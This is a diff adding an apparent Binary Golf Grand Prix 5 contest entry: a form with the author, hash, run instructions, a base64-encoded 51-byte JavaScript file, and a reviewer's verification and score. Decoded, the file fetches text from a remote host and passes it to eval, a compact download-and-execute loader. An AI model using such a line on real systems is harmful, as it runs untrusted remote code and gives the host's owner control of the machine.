@@ -1,0 +1,23 @@
+---BEGIN BGGPx---
+Submit Date: 06/24/2024
+BGGP Challenge Number: 5
+Author: Lucas Botelho
+Contact Info (Optional): @luskabol   
+Online Presence (Website/Social Media): https://udp.re 
+Target File Type: JavaScript
+File Size: 51 bytes
+SHA256 Hash: 00b72205169cb2a13e3641f51d3795e3d5c45610687a2c1450cc4da19116051b 
+Target Environment (How do we run the file?): Any computer with node installed. `node x.js`
+Any additional info?: Save the content in a file and run with `node file.js`
+Link to PoC video, screenshot, or console output, if any: Another #BGGP5 download!! @binarygolf https://binary.golf
+Link to writeup, if any: 
+File contents (base64 encoded please): ZmV0Y2goImh0dHA6Ly91ZHAucmUiKS50aGVuKGM9PmMudGV4dCgpKS50aGVuKGV2YWwp
+---END BGGPx---
+
+---BEGIN VERIFICATION---
+Reviewer: XfavataX
+Review Date: 2024-06-25
+SHA256: 00b72205169cb2a13e3641f51d3795e3d5c45610687a2c1450cc4da19116051b
+Score: 4035
+Note: Tested on Kali 2023.4 with Node v18.20.1
+---END VERIFICATION---
